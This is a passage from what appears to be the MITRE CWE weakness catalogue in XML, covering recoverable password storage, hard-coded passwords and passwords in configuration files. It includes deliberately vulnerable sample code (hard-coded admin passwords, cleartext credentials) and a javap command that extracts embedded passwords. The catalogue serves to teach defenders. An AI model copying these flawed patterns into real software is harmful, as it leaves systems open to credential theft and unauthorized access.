      </Weakness>
      <Weakness ID="257" Name="Storing Passwords in a Recoverable Format" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="259" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>User's passwords may be revealed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Revealed passwords may be reused elsewhere to impersonate the users in question.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use strong, non-reversible encryption to protect stored passwords.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-59">
               <Intro_Text>Both of these examples verify a password by comparing it to a stored compressed version.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">if (strcmp(compress(password), compressed_password)) {<xhtml:div style="margin-left:1em;">printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (passwd.Equals(compress(password), compressed_password)) {<xhtml:div style="margin-left:1em;">return(0);</xhtml:div>}<xhtml:br/>
                        <xhtml:i>//Diagnostic Mode</xhtml:i>
                        <xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Storing passwords in a recoverable format</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="49"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The meaning of this entry needs to be investigated more closely, especially with respect to what is meant by "recoverable."</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="259" Name="Use of Hard-coded Password" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.</Description>
         <Extended_Description>
            <xhtml:p>A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>Inbound: the product contains an authentication mechanism that checks for a hard-coded password.</xhtml:div>
               <xhtml:div>Outbound: the product connects to another system or component, and it contains hard-coded password for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="798" View_ID="1340" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="321" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="257" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If hard-coded passwords are used, it is almost certain that malicious users will gain access through the account in question.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11.6">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using disassembled code, look at the associated instructions and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Perform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For front-end to back-end connections: Three solutions are possible, although none are complete.</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.</xhtml:div>
                     <xhtml:div>Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.</xhtml:div>
                     <xhtml:div>Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks.</xhtml:div>
                  </xhtml:div>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-13">
               <Intro_Text>The following code uses a hard-coded password to connect to a database:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>DriverManager.getConnection(url, "scott", "tiger");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>javap -c ConnMngr.class<xhtml:div style="margin-left:1em;">22: ldc #36; //String jdbc:mysql://ixne.com/rxsql<xhtml:br/>24: ldc #38; //String scott<xhtml:br/>26: ldc #17; //String tiger</xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-14">
               <Intro_Text>The following code is an example of an internal hard-coded password in the back-end:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password, "Mew!")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 printf("Incorrect Password!\n");<xhtml:br/>return(0)</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (!password.equals("Mew!")) {<xhtml:div style="margin-left:1em;">return(0)</xhtml:div>}<xhtml:br/>//Diagnostic Mode<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>Multiple vendors used hard-coded credentials in their OT products.</Body_Text>
	         </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29964</Reference>
               <Description>Distributed Control System (DCS) has hard-coded passwords for local shell access</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29964</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2021-37555</Reference>
	      <Description>Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2021-37555</Link>
	    </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Password Management: Hard-Coded Password</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Use of hard-coded password</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC03-J</Entry_ID>
               <Entry_Name>Never hard code sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP33</Entry_ID>
               <Entry_Name>Hardcoded sensitive data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
            <Reference External_Reference_ID="REF-1283"/>
	    <Reference External_Reference_ID="REF-1288"/>
	    <Reference External_Reference_ID="REF-1304"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry could be split into multiple variants: an inbound variant (as seen in the second demonstrative example) and an outbound variant (as seen in the first demonstrative example). These variants are likely to have different consequences, detectability, etc. More importantly, from a vulnerability theory perspective, they could be characterized as different behaviors.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-13</Modification_Date>
               <Modification_Comment>Significant description modifications to emphasize different variants.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-02-16">Hard-Coded Password</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="260" Name="Password in Configuration File" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product stores a password in a configuration file that might be accessible to actors who do not know the password.</Description>
         <Extended_Description>This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid storing passwords in easily accessible locations.</Description>
            </Mitigation>
            <Mitigation>
